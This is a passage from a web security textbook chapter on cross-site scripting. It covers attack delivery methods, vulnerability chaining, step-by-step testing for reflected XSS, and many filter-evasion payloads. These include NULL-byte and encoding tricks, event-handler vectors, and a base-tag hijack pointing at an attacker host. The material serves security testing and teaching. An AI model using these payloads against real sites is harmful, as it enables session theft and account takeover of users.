    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 447\nChapter 12 n Attacking Users: Cross-Site Scripting 447\narbitrary code execution on the computer of a victim user. For example,\nif a site is running in the Trusted Sites zone of Internet Explorer, injecting\nthe following code causes the Windows calculator program to launch on\nthe user’s computer:\n<script>\nvar o = new ActiveXObject(‘WScript.shell’);\no.Run(‘calc.exe’);\n</script>\nn Web applications often deploy ActiveX controls containing powerful\nmethods (see Chapter 13). Some applications seek to prevent misuse by\na third party by verifying within the control itself that the invoking web\npage was issued from the correct website. In this situation, the control can\nstill be misused via an XSS attack, because in that instance the invoking\ncode satisfi es the trust check implemented within the control."
  },
  {
    "index": 10,
    "text": "COMMON MYTH\n“Phishing and XSS only affect applications on the public Internet.”\nXSS bugs can affect any type of web application, and an attack against\nan intranet-based application, delivered via a group e-mail, can exploit two\nforms of trust. First, there is the social trust exploited by an internal e-mail\nsent between colleagues. Second, victims’ browsers often trust corporate\nweb servers more than they do those on the public Internet. For example,\nwith Internet Explorer, if a computer is part of a corporate domain, the\nbrowser defaults to a lower level of security when accessing intranet-based\napplications.\nEscalating the Client-Side Attack\nA website may directly attack users who visit it in numerous ways, such as log-\nging their keystrokes, capturing their browsing history, and port-scanning the\nlocal network. Any of these attacks may be delivered via a cross-site scripting\nfl aw in a vulnerable application, although they may also be delivered directly\nby any malicious website that a user happens to visit. Attacks of this kind are\ndescribed in more detail at the end of Chapter 13.\nDelivery Mechanisms for XSS Attacks\nHaving identifi ed an XSS vulnerability and formulated a suitable payload to\nexploit it, an attacker needs to fi nd some means of delivering the attack to other\ncc1122..iinndddd 444477 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 448\n448 Chapter 12 n Attacking Users: Cross-Site Scripting\nusers of the application. We have already discussed several ways in which this\ncan be done. In fact, many other delivery mechanisms are available to an attacker.\nDelivering Refl ected and DOM-Based XSS Attacks\nIn addition to the obvious phishing vector of bulk e-mailing a crafted URL to\nrandom users, an attacker may attempt to deliver a refl ected or DOM-based\nXSS attack via the following mechanisms:\nn In a targeted attack, a forged e-mail may be sent to a single target user or\na small number of users. For example, an application administrator could\nbe sent an e-mail apparently originating from a known user, complain-\ning that a specifi c URL is causing an error. When an attacker wants to\ncompromise the session of a specifi c user (rather than harvesting those of\nrandom users), a well-informed and convincing targeted attack is often\nthe most effective delivery mechanism. This type of attack is sometimes\nreferred to as “spear phishing”.\nn A URL can be fed to a target user in an instant message.\nn Content and code on third-party websites can be used to generate requests\nthat trigger XSS fl aws. Numerous popular applications allow users to\npost limited HTML markup that is displayed unmodifi ed to other users.\nIf an XSS vulnerability can be triggered using the GET method, an attacker\ncan post an IMG tag on a third-party site targeting the vulnerable URL.\nAny user who views the third-party content will unwittingly request the\nmalicious URL.\nAlternatively, the attacker might create his own website containing inter-\nesting content as an inducement for users to visit. It also contains content\nthat causes the user’s browser to make requests containing XSS payloads\nto a vulnerable application. If a user is logged in to the vulnerable applica-\ntion, and she happens to browse to the attacker’s site, the user’s session\nwith the vulnerable application is compromised.\nHaving created a suitable website, an attacker may use search engine\nmanipulation techniques to generate visits from suitable users, such as by\nplacing relevant keywords within the site content and linking to the site\nusing relevant expressions. This delivery mechanism has nothing to do\nwith phishing, however. The attacker’s site does not attempt to imperson-\nate the site it is targeting.\nNote that this delivery mechanism can enable an attacker to exploit refl ected\nand DOM-based XSS vulnerabilities that can be triggered only via POST\nrequests. With these vulnerabilities, there is obviously not a simple URL\nthat can be fed to a victim user to deliver an attack. However, a malicious\ncc1122..iinndddd 444488 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 449\nChapter 12 n Attacking Users: Cross-Site Scripting 449\nwebsite may contain an HTML form that uses the POST method and that\nhas the vulnerable application as its target URL. JavaScript or navigational\ncontrols on the page can be used to submit the form, successfully exploit-\ning the vulnerability.\nn In a variation on the third-party website attack, some attackers have been\nknown to pay for banner advertisements that link to a URL containing\nan XSS payload for a vulnerable application. If a user is logged in to the\nvulnerable application and clicks the ad, her session with that applica-\ntion is compromised. Because many providers use keywords to assign\nadvertisements to pages that are related to them, cases have even arisen\nwhere an ad attacking a particular application is assigned to the pages of\nthat application itself! This not only lends credibility to the attack but also\nguarantees that someone who clicks the ad is using the vulnerable appli-\ncation at the moment the attack strikes. Furthermore, since the targeted\nURL is now “on-site,” the attack can bypass browser-based mechanisms\nemployed to defend against XSS (described in detail later in this chap-\nter). Because many banner ad providers charge on a per-click basis, this\ntechnique effectively enables an attacker to “buy” a specifi c number of\nuser sessions.\nn Many web applications implement a function to “tell a friend” or send\nfeedback to site administrators. This function often enables a user to\ngenerate an e-mail with arbitrary content and recipients. An attacker\nmay be able to leverage this functionality to deliver an XSS attack via an\ne-mail that actually originates from the organization’s own server. This\nincreases the likelihood that even technically knowledgeable users and\nanti-malware software will accept it.\nDelivering Stored XSS Attacks\nThe two kinds of delivery mechanisms for stored XSS attacks are in-band and\nout-of-band.\nIn-band delivery applies in most cases and is used when the data that is\nthe subject of the vulnerability is supplied to the application via its main web\ninterface. Common locations where user-controllable data may eventually be\ndisplayed to other users include the following:\nn Personal information fi elds — name, address, e-mail, telephone, and the like\nn Names of documents, uploaded fi les, and other items\nn Feedback or questions for application administrators\nn Messages, status updates, comments, questions, and the like for other\napplication users\ncc1122..iinndddd 444499 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 450\n450 Chapter 12 n Attacking Users: Cross-Site Scripting\nn Anything that is recorded in application logs and displayed in-browser\nto administrators, such as URLs, usernames, HTTP Referer,User-Agent,\nand the like\nn The contents of uploaded fi les that are shared between users\nIn these cases, the XSS payload is delivered simply by submitting it to\nthe relevant page within the application and then waiting for victims to view the\nmalicious data.\nOut-of-band delivery applies in cases where the data that is the subject of\nthe vulnerability is supplied to the application through some other channel.\nThe application receives data via this channel and ultimately renders it within\nHTML pages that are generated within its main web interface. An example\nof this delivery mechanism is the attack already described against web mail\napplications. It involves sending malicious data to an SMTP server, which is\neventually displayed to users within an HTML-formatted e-mail message.\nChaining XSS and Other Attacks\nXSS fl aws can sometimes be chained with other vulnerabilities to devastating\neffect. The authors encountered an application that had a stored XSS vulner-\nability within the user’s display name. The only purpose for which this item\nwas used was to show a personalized welcome message after the user logged\nin. The display name was never displayed to other application users, so initially\nthere appeared to be no attack vector for users to cause problems by editing\ntheir own display name. Other things being equal, the vulnerability would be\nclassifi ed as very low risk.\nHowever, a second vulnerability existed within the application. Defective\naccess controls meant that any user could edit the display name of any other\nuser. Again, on its own, this issue had minimal signifi cance: Why would an\nattacker be interested in changing the display names of other users?\nChaining together these two low-risk vulnerabilities enabled an attacker to\ncompletely compromise the application. It was easy to automate an attack to inject\na script into the display name of every application user. This script executed\nevery time a user logged in to the application and transmitted the user’s ses-\nsion token to a server owned by the attacker. Some of the application’s users\nwere administrators, who logged in frequently and who could create new users\nand modify the privileges of other users. An attacker simply had to wait for an\nadministrator to log in, hijack the administrator’s session, and then upgrade his\nown account to have administrative privileges. The two vulnerabilities together\nrepresented a critical risk to the application’s security.\nIn a different example, data that was presented only to the user who submit-\nted it could be updated via a cross-site request forgery attack (see Chapter 13).\nIt also contained a stored XSS vulnerability. Again, each bug when considered\ncc1122..iinndddd 445500 88//1199//22001111 1122::1122::2288 PPMM"
  },
  {
    "index": 11,
    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 451\nChapter 12 n Attacking Users: Cross-Site Scripting 451\nindividually might be regarded as relatively low risk; however, when exploited\ntogether, they can have a critical impact."
  },
  {
    "index": 12,
    "text": "COMMON MYTH\n“We’re not worried about that low-risk XSS bug. A user could exploit it only to\nattack himself.”\nEven apparently low-risk vulnerabilities can, under the right circumstances,\npave the way for a devastating attack. Taking a defense-in-depth approach to\nsecurity entails removing every known vulnerability, however insignifi cant it\nmay seem. The authors have even used XSS to place fi le browser dialogs or\nActiveX controls into the page response, helping to break out of a kiosk-mode\nsystem bound to a target web application. Always assume that an attacker\nwill be more imaginative than you in devising ways to exploit minor bugs!\nFinding and Exploiting XSS Vulnerabilities\nA basic approach to identifying XSS vulnerabilities is to use a standard proof-\nof-concept attack string such as the following:\n“><script>alert(document.cookie)</script>\nThis string is submitted as every parameter to every page of the application,\nand responses are monitored for the appearance of this same string. If cases\nare found where the attack string appears unmodifi ed within the response, the\napplication is almost certainly vulnerable to XSS.\nIf your intention is simply to identify some instance of XSS within the applica-\ntion as quickly as possible to launch an attack against other application users,\nthis basic approach is probably the most effective, because it can be easily auto-\nmated and produces minimal false positives. However, if your objective is to\nperform a comprehensive test of the application to locate as many individual\nvulnerabilities as possible, the basic approach needs to be supplemented with\nmore sophisticated techniques. There are several different ways in which XSS\nvulnerabilities may exist within an application that will not be identifi ed via\nthe basic approach to detection:\nn Many applications implement rudimentary blacklist-based fi lters in an\nattempt to prevent XSS attacks. These fi lters typically look for expressions\nsuch as <script> within request parameters and take some defensive action\nsuch as removing or encoding the expression or blocking the request.\nThese fi lters often block the attack strings commonly employed in the\nbasic approach to detection. However, just because one common attack\ncc1122..iinndddd 445511 88//1199//22001111 1122::1122::2288 PPMM"
  },
  {
    "index": 13,
    "text": "Stuttard c12.indd V2 - 08/10/2011 Page 452\n452 Chapter 12 n Attacking Users: Cross-Site Scripting\nstring is being fi ltered, this does not mean that an exploitable vulnerability\ndoes not exist. As you will see, there are cases in which a working XSS\nexploit can be created without using <script> tags and even without\nusing commonly fi ltered characters such as “<> and /.\nn The anti-XSS fi lters implemented within many applications are defective\nand can be circumvented through various means. For example, suppose\nthat an application strips any <script> tags from user input before it is\nprocessed. This means that the attack string used in the basic approach\nwill not be returned in any of the application’s responses. However, it\nmay be that one or more of the following strings will bypass the fi lter\nand result in a successful XSS exploit:\n“><script >alert(document.cookie)</script >\n“><ScRiPt>alert(document.cookie)</ScRiPt>\n“%3e%3cscript%3ealert(document.cookie)%3c/script%3e\n“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>\n%00“><script>alert(document.cookie)</script>\nTRY IT!\nhttp://mdsec.net/search/28/\nhttp://mdsec.net/search/36/\nhttp://mdsec.net/search/21/\nNote that in some of these cases, the input string may be sanitized, decoded,\nor otherwise modifi ed before being returned in the server’s response, yet might\nstill be suffi cient for an XSS exploit. In this situation, no detection approach based\non submitting a specifi c string and checking for its appearance in the server’s\nresponse will in itself succeed in fi nding the vulnerability.\nIn exploits of DOM-based XSS vulnerabilities, the attack payload is not nec-\nessarily returned in the server’s response but is retained in the browser DOM\nand accessed from there by client-side JavaScript. Again, in this situation, no\napproach based on submitting a specifi c string and checking for its appearance\nin the server’s response will succeed in fi nding the vulnerability.\nFinding and Exploiting Refl ected XSS Vulnerabilities\nThe most reliable approach to detecting refl ected XSS vulnerabilities involves\nworking systematically through all the entry points for user input that were\nidentifi ed during application mapping (see Chapter 4) and following these steps:\nn Submit a benign alphabetical string in each entry point.\nn Identify all locations where this string is refl ected in the application’s\nresponse.\ncc1122..iinndddd 445522 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 453\nChapter 12 n Attacking Users: Cross-Site Scripting 453\nn For each refl ection, identify the syntactic context in which the refl ected\ndata appears.\nn Submit modifi ed data tailored to the refl ection’s syntactic context, attempt-\ning to introduce arbitrary script into the response.\nn If the refl ected data is blocked or sanitized, preventing your script from\nexecuting, try to understand and circumvent the application’s defensive\nfi lters.\nIdentifying Refl ections of User Input\nThe fi rst stage in the testing process is to submit a benign string to each entry\npoint and to identify every location in the response where the string is refl ected."
  },
  {
    "index": 14,
    "text": "HACK STEPS\n1. Choose a unique arbitrary string that does not appear anywhere within\nthe application and that contains only alphabetical characters and there-\nfore is unlikely to be affected by any XSS-specific filters. For example:\nmyxsstestdmqlwp\nSubmit this string as every parameter to every page, targeting only one\nparameter at a time.\n2. Monitor the application’s responses for any appearance of this same\nstring. Make a note of every parameter whose value is being copied into\nthe application’s response. These are not necessarily vulnerable, but each\ninstance identified is a candidate for further investigation, as described in\nthe next section.\n3. Note that both GET and POST requests need to be tested. You should\ninclude every parameter within both the URL query string and the mes-\nsage body. Although a smaller range of delivery mechanisms exists for\nXSS vulnerabilities that can be triggered only by a POST request, exploita-\ntion is still possible, as previously described.\n4. In any cases where XSS was found in a POST request, use the “change\nrequest method” option in Burp to determine whether the same attack\ncould be performed as a GET request.\n5. In addition to the standard request parameters, you should test every\ninstance in which the application processes the contents of an HTTP\nrequest header. A common XSS vulnerability arises in error messages,\nwhere items such as the Referer and User-Agent headers are copied\ninto the message’s contents. These headers are valid vehicles for deliver-\ning a reflected XSS attack, because an attacker can use a Flash object to\ninduce a victim to issue a request containing arbitrary HTTP headers.\ncc1122..iinndddd 445533 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 454\n454 Chapter 12 n Attacking Users: Cross-Site Scripting\nTesting Refl ections to Introduce Script\nYou must manually investigate each instance of refl ected input that you have\nidentifi ed to verify whether it is actually exploitable. In each location where\ndata is refl ected in the response, you need to identify the syntactic context of\nthat data. You must fi nd a way to modify your input such that, when it is copied\ninto the same location in the application’s response, it results in execution of\narbitrary script. Let’s look at some examples.\nExample 1: A Tag Attribute Value\nSuppose that the returned page contains the following:\n<input type=”text” name=”address1” value=”myxsstestdmqlwp”>\nOne obvious way to craft an XSS exploit is to terminate the double quota-\ntion marks that enclose the attribute value, close the <input> tag, and then\nemploy some means of introducing JavaScript, such as a <script> tag. For\nexample:\n“><script>alert(1)</script>\nAn alternative method in this situation, which may bypass certain input fi lters,\nis to remain within the <input> tag itself but inject an event handler containing\nJavaScript. For example:\n“ onfocus=”alert(1)\nExample 2: A JavaScript String\nSuppose that the returned page contains the following:\n<script>var a = ‘myxsstestdmqlwp’; var b = 123; ... </script>\nHere, the input you control is being inserted directly into a quoted string\nwithin an existing script. To craft an exploit, you could terminate the single\nquotation marks around your string, terminate the statement with a semicolon,\nand then proceed directly to your desired JavaScript:\n‘; alert(1); var foo=’\nNote that because you have terminated a quoted string, to prevent errors\nfrom occurring within the JavaScript interpreter you must ensure that the\nscript continues gracefully with valid syntax after your injected code. In this\nexample, the variable foo is declared, and a second quoted string is opened. It\nwill be terminated by the code that immediately follows your string. Another\nmethod that is often effective is to end your input with // to comment out the\nremainder of the line.\ncc1122..iinndddd 445544 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 455\nChapter 12 n Attacking Users: Cross-Site Scripting 455\nExample 3: An Attribute Containing a URL\nSuppose that the returned page contains the following:\n<a href=”myxsstestdmqlwp”>Click here ...</a>\nHere, the string you control is being inserted into the href attribute of an <a>\ntag. In this context, and in many others in which attributes may contain URLs,\nyou can use the javascript: protocol to introduce script directly within the\nURL attribute:\njavascript:alert(1);\nBecause your input is being refl ected within a tag attribute, you can also inject\nan event handler, as already described.\nFor an attack that works against all current browsers, you can use an invalid\nimage name together with an onclick event handler:\n#”onclick=”javascript:alert(1)\nTIP As with other attacks, be sure to URL-encode any special characters that\nhave signifi cance within the request, including & = + ; and space."
  },
  {
    "index": 15,
    "text": "HACK STEPS\nDo the following for each refl ected input identifi ed in the previous steps:\n1. Review the HTML source to identify the location(s) where your unique\nstring is being reflected. 2. If the string appears more than once, each occurrence needs to be treated\nas a separate potential vulnerability and investigated individually. 3. Determine, from the location within the HTML of the user-controllable\nstring, how you need to modify it to cause execution of arbitrary script. Typically, numerous different methods will be potential vehicles for an\nattack, as described later in this chapter. 4. Test your exploit by submitting it to the application. If your crafted string\nis still returned unmodified, the application is vulnerable. Double-check\nthat your syntax is correct by using a proof-of-concept script to display an\nalert dialog, and confirm that this actually appears in your browser when\nthe response is rendered. Probing Defensive Filters\nVery often, you will discover that the server modifi es your initial attempted\nexploits in some way, so they do not succeed in executing your injected script. cc1122..iinndddd 445555 88//1199//22001111 1122::1122::2288 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 456\n456 Chapter 12 n Attacking Users: Cross-Site Scripting\nIf this happens, do not give up! Your next task is to determine what server-\nside processing is occurring that is affecting your input. There are three broad\npossibilities:\nn The application (or a web application fi rewall protecting the application)\nhas identifi ed an attack signature and has blocked your input. n The application has accepted your input but has performed some kind of\nsanitization or encoding on the attack string. n The application has truncated your attack string to a fi xed maximum length. We will look at each scenario in turn and discuss various ways in which the\nobstacles presented by the application’s processing can be bypassed. Beating Signature-Based Filters\nIn the fi rst type of fi lter, the application typically responds to your attack string\nwith an entirely different response than it did for the harmless string. For\nexample, it might respond with an error message, possibly even stating that a\npossible XSS attack was detected, as shown in Figure 12-8. Figure 12-8: An error message generated by ASP.NET’s anti-XSS filters\nIf this occurs, the next step is to determine what characters or expressions\nwithin your input are triggering the fi lter. An effective approach is to remove\ndifferent parts of your string in turn and see whether the input is still being\nblocked. Typically, this process establishes fairly quickly that a specifi c expres-\nsion such as <script> is causing the request to be blocked. You then need to\ntest the fi lter to establish whether any bypasses exist. There are so many different ways to introduce script code into HTML pages\nthat signature-based fi lters normally can be bypassed. You can fi nd an alternative\ncc1122..iinndddd 445566 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 457\nChapter 12 n Attacking Users: Cross-Site Scripting 457\nmeans of introducing script, or you can use slightly malformed syntax that\nbrowsers tolerate. This section examines the numerous different methods of\nexecuting scripts. Then it describes a wide range of techniques that can be used\nto bypass common fi lters. Ways of Introducing Script Code\nYou can introduce script code into an HTML page in four broad ways. We will\nexamine these in turn, and give some unusual examples of each that may suc-\nceed in bypassing signature-based input fi lters. NOTE Browser support for different HTML and scripting syntax varies\nwidely. The behavior of individual browsers often changes with each new\nversion. Any “defi nitive” guide to individual browsers’ behavior is therefore\nliable to quickly become out of date. However, from a security perspective,\napplications need to behave in a robust way for all current and recent versions\nof popular browsers. If an XSS attack can be delivered using only one specifi c\nbrowser that is used by only a small percentage of users, this still constitutes\na vulnerability that should be fi xed. All the examples given in this chapter\nwork on at least one major browser at the time of writing. For reference purposes, this chapter was written in March 2011, and the\nattacks described all work on at least one of the following:\nn Internet Explorer version 8.0.7600.16385\nn Firefox version 3.6.15\nScript Tags\nBeyond directly using a <script> tag, there are various ways in which you can\nuse somewhat convoluted syntax to wrap the use of the tag, defeating some fi lters:\n<object data=”data:text/html,<script>alert(1)</script>”>\n<object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>\n<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>\nClick here</a>\nThe Base64-encoded string in the preceding examples is:\n<script>alert(1)</script>\nEvent Handlers\nNumerous event handlers can be used with various tags to cause a script to\nexecute. The following are some little-known examples that execute script\nwithout requiring any user interaction:\n<xml onreadystatechange=alert(1)>\n<style onreadystatechange=alert(1)>\n<iframe onreadystatechange=alert(1)>\ncc1122..iinndddd 445577 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 458\n458 Chapter 12 n Attacking Users: Cross-Site Scripting\n<object onerror=alert(1)>\n<object type=image src=valid.gif onreadystatechange=alert(1)></object>\n<img type=image src=valid.gif onreadystatechange=alert(1)>\n<input type=image src=valid.gif onreadystatechange=alert(1)>\n<isindex type=image src=valid.gif onreadystatechange=alert(1)>\n<script onreadystatechange=alert(1)>\n<bgsound onpropertychange=alert(1)>\n<body onbeforeactivate=alert(1)>\n<body onactivate=alert(1)>\n<body onfocusin=alert(1)>\nHTML5 provides a wealth of new vectors using event handlers. These include\nthe use of the autofocus attribute to automatically trigger events that previously\nrequired user interaction:\n<input autofocus onfocus=alert(1)>\n<input onblur=alert(1) autofocus><input autofocus>\n<body onscroll=alert(1)><br><br>...<br><input autofocus>\nIt allows event handlers in closing tags:\n</a onmousemove=alert(1)>\nFinally, HTML5 introduces new tags with event handlers:\n<video src=1 onerror=alert(1)>\n<audio src=1 onerror=alert(1)>\nScript Pseudo-Protocols\nScript pseudo-protocols can be used in various locations to execute inline script\nwithin an attribute that expects a URL. Here are some examples:\n<object data=javascript:alert(1)>\n<iframe src=javascript:alert(1)>\n<embed src=javascript:alert(1)>\nAlthough the javascript pseudo-protocol is most commonly given as an\nexample of this technique, you can also use the vbs protocol on Internet Explorer\nbrowsers, as described later in this chapter. As with event handlers, HTML5 provides some new ways of using script\npseudo-protocols in XSS attacks:\n<form id=test /><button form=test formaction=javascript:alert(1)>\n<event-source src=javascript:alert(1)>\nThe new event-source tag is of particular interest when targeting input fi lters. Unlike any pre-HTML5 tags, its name includes a hyphen, so using this tag may\nbypass legacy regex-based fi lters that assume tag names can contain only letters. cc1122..iinndddd 445588 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 459\nChapter 12 n Attacking Users: Cross-Site Scripting 459\nDynamically Evaluated Styles\nSome browsers support the use of JavaScript within dynamically evaluated\nCSS styles. The following example works on IE7 and earlier, and also on later\nversions when running in compatibility mode:\n<x style=x:expression(alert(1))>\nLater versions of IE removed support for the preceding syntax, on the basis\nthat its only usage in practice was in XSS attacks. However, on later versions of\nIE, the following can be used to the same effect:\n<x style=behavior:url(#default#time2) onbegin=alert(1)>\nThe Firefox browser used to allow CSS-based attacks via the moz-binding\nproperty, but restrictions made to this feature mean that it is now less useful\nin most XSS scenarios. Bypassing Filters: HTML\nThe preceding sections described numerous ways in which script code can be\nexecuted from within an HTML page. In many cases, you may fi nd that signature-\nbased fi lters can be defeated simply by switching to a different, lesser-known\nmethod of executing script. If this fails, you need to look at ways of obfuscating\nyour attack. Typically you can do this by introducing unexpected variations\nin your syntax that the fi lter accepts and that the browser tolerates when the\ninput is returned. This section examines the ways in which HTML syntax can\nbe obfuscated to defeat common fi lters. The following section applies the same\nprinciples to JavaScript and VBScript syntax. Signature-based fi lters designed to block XSS attacks normally employ regular\nexpressions or other techniques to identify key HTML components, such as tag\nbrackets, tag names, attribute names, and attribute values. For example, a fi lter\nmay seek to block input containing HTML that uses specifi c tag or attribute\nnames known to allow the introduction of script, or it may try to block attri-\nbute values starting with a script pseudo-protocol. Many of these fi lters can be\nbypassed by placing unusual characters at key points within the HTML in a\nway that one or more browsers tolerate. To see this technique in action, consider the following simple exploit:\n<img onerror=alert(1) src=a>\nYou can modify this syntax in numerous ways and still have your code execute\non at least one browser. We will examine each of these in turn. In practice, you\nmay need to combine several of these techniques in a single exploit to bypass\nmore sophisticated input fi lters. cc1122..iinndddd 445599 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 460\n460 Chapter 12 n Attacking Users: Cross-Site Scripting\nThe Tag Name\nStarting with the opening tag name, the most simple and naïve fi lters can be\nbypassed simply by varying the case of the characters used:\n<iMg onerror=alert(1) src=a>\nGoing further, you can insert NULL bytes at any position:\n<[%00]img onerror=alert(1) src=a>\n<i[%00]mg onerror=alert(1) src=a>\n(In these examples, [%XX] indicates the literal character with the hexadecimal\nASCII code of XX. When submitting your attack to the application, generally you\nwould use the URL-encoded form of the character. When reviewing the applica-\ntion’s response, you need to look for the literal decoded character being refl ected.)\nTIP The NULL byte trick works on Internet Explorer anywhere within the\nHTML page. Liberal use of NULL bytes in XSS attacks often provides a quick\nway to bypass signature-based fi lters that are unaware of IE’s behavior. Using NULL bytes has historically proven effective against web applica-\ntion fi rewalls (WAFs) confi gured to block requests containing known attack\nstrings. Because WAFs typically are written in native code for performance\nreasons, a NULL byte terminates the string in which it appears. This prevents\nthe WAF from seeing the malicious payload that comes after the NULL (see\nChapter 16 for more details). Going further within tag names, if you modify the example slightly, you can\nuse arbitrary tag names to introduce event handlers, thereby bypassing fi lters\nthat merely block specifi c named tags:\n<x onclick=alert(1) src=a>Click here</x>\nIn some situations, you may be able to introduce new tags with various names\nbut not fi nd any means of using these to directly execute code. In these situa-\ntions, you may be able to deliver an attack using a technique known as “base tag\nhijacking.” The <base> tag is used to specify a URL that the browser should use\nto resolve any relative URLs that appear subsequently within the page."
  },
  {
    "index": 16,
    "text": "If you can\nintroduce a new <base> tag, and the page performs any <script> includes after\nyour refl ection point using relative URLs, you can specify a base URL to a server\nthat you control. When the browser loads the scripts specifi ed in the remainder of\nthe HTML page, they are loaded from the server you specifi ed, yet they are still\nexecuted in the context of the page that has invoked them. For example:\n<base href=”http://mdattacker.net/badscripts/”>\n... <script src=”goodscript.js”></script>\ncc1122..iinndddd 446600 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 461\nChapter 12 n Attacking Users: Cross-Site Scripting 461\nAccording to specifi cations, <base> tags should appear within the <head>\nsection of the HTML page. However, some browsers, including Firefox, accept\n<base> tags appearing anywhere in the page, considerably widening the scope\nof this attack. Space Following the Tag Name\nSeveral characters can replace the space between the tag name and the fi rst\nattribute name:\n<img/onerror=alert(1) src=a>\n<img[%09]onerror=alert(1) src=a>\n<img[%0d]onerror=alert(1) src=a>\n<img[%0a]onerror=alert(1) src=a>\n<img/”onerror=alert(1) src=a>\n<img/’onerror=alert(1) src=a>\n<img/anyjunk/onerror=alert(1) src=a>\nNote that even where an attack does not require any tag attributes, you should\nalways try adding some superfl uous content after the tag name, because this\nbypasses some simple fi lters:\n<script/anyjunk>alert(1)</script>\nAttribute Names\nWithin the attribute name, you can use the same NULL byte trick described\nearlier. This bypasses many simple fi lters that try to block event handlers by\nblocking attribute names starting with on:\n<img o[%00]nerror=alert(1) src=a>\nAttribute Delimiters\nIn the original example, attribute values were not delimited, requiring some\nwhitespace after the attribute value to indicate that it has ended before another\nattribute can be introduced. Attributes can optionally be delimited with double\nor single quotes or, on IE, with backticks:\n<img onerror=”alert(1)”src=a>\n<img onerror=’alert(1)’src=a>\n<img onerror=`alert(1)`src=a>\nSwitching around the attributes in the preceding example provides a further\nway to bypass some fi lters that check for attribute names starting with on. If\nthe fi lter is unaware that backticks work as attribute delimiters, it treats the\nfollowing example as containing a single attribute, whose name is not that of\nan event handler:\n<img src=`a`onerror=alert(1)>\ncc1122..iinndddd 446611 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 462\n462 Chapter 12 n Attacking Users: Cross-Site Scripting\nBy combining quote-delimited attributes with unexpected characters\nfollowing the tag name, attacks can be devised that do not use any whitespace,\nthereby bypassing some simple fi lters:\n<img/onerror=”alert(1)”src=a>\nTRY IT! http://mdsec.net/search/69/\nhttp://mdsec.net/search/72/\nhttp://mdsec.net/search/75/\nAttribute Values\nWithin attribute values themselves, you can use the NULL byte trick, and you\nalso can HTML-encode characters within the value:\n<img onerror=a[%00]lert(1) src=a>\n<img onerror=a&#x6c;ert(1) src=a>\nBecause the browser HTML-decodes the attribute value before processing\nit further, you can use HTML encoding to obfuscate your use of script code,\nthereby evading many fi lters. For example, the following attack bypasses many\nfi lters seeking to block use of the JavaScript pseudo-protocol handler:\n<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >\nWhen using HTML encoding, it is worth noting that browse rs tolerate vari-\nous deviations from the specifi cations, in ways that even fi lters that are aware\nof HTML encoding issues may overlook. You can use both decimal and hexa-\ndecimal format, add superfl uous leading zeros, and omit the trailing semicolon. The following examples all work on at least one browser:\n<img onerror=a&#x06c;ert(1) src=a>\n<img onerror=a&#x006c;ert(1) src=a>\n<img onerror=a&#x0006c;ert(1) src=a>\n<img onerror=a&#108;ert(1) src=a>\n<img onerror=a&#0108;ert(1) src=a>\n<img onerror=a&#108ert(1) src=a>\n<img onerror=a&#0108ert(1) src=a>\nTag Brackets\nIn some situations, by exploiting quirky application or browser behavior, it is\npossible to use invalid tag brackets and still cause the browser to process the\ntag in the way the attack requires. cc1122..iinndddd 446622 88//1199//22001111 1122::1122::2299 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 463\nChapter 12 n Attacking Users: Cross-Site Scripting 463\nSome applications perform a superfl uous URL decode of input after their\ninput fi lters have been applied, so the following input appearing in a request:\n%253cimg%20onerror=alert(1)%20src=a%253e\nis URL-decoded by the application server and passed to the application as:\n%3cimg onerror=alert(1) src=a%3e\nwhich does not contain any tag brackets and therefore is not blocked by the\ninput fi lter. However, the application then performs a second URL decode, so\nthe input becomes:\n<img onerror=alert(1) src=a>\nwhich is echoed to the user, causing the attack to execute. As described in Chapter 2, something similar can happen when an application\nframework “translates” unusual Unicode characters into their nearest ASCII\nequivalents based on the similarity of their glyphs or phonetics. For example,\nthe following input uses Unicode double-angle quotation marks (%u00AB and\n%u00BB) instead of tag brackets:\n«img onerror=alert(1) src=a»\nThe application’s input fi lters may allow this input because it does not\ncontain any problematic HTML. However, if the application framework trans-\nlates the quotation marks into tag characters at the point where the input is\ninserted into a response, the attack succeeds. Numerous applications have\nbeen found vulnerable to this kind of attack, which developers may be for-\ngiven for overlooking. Some input fi lters identify HTML tags by simply matching opening and clos-\ning angle brackets, extracting the contents, and comparing this to a blacklist\nof tag names. In this situation, you may be able to bypass the fi lter by using\nsuperfl uous brackets, which the browser tolerates:\n<<script>alert(1);//<</script>\nIn some cases, unexpected behavior in browsers’ HTML parsers can be lever-\naged to deliver an attack that bypasses an application’s input fi lters. For example,\nthe following HTML, which uses ECMAScript for XML (E4X) syntax, does not\ncontain a valid opening script tag but nevertheless executes the enclosed script\non current versions of Firefox:\n<script<{alert(1)}/></script>\ncc1122..iinndddd 446633 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 464\n464 Chapter 12 n Attacking Users: Cross-Site Scripting\nTIP In several of the fi lter bypasses described, the attack results in HTML\nthat is malformed but is nevertheless tolerated by the client browser. Because\nnumerous quite legitimate websites contain HTML that does not strictly com-\nply to the standards, browsers accept HTML that is deviant in all kinds of ways. They effectively fi x the errors behind the scenes before the page is rendered. 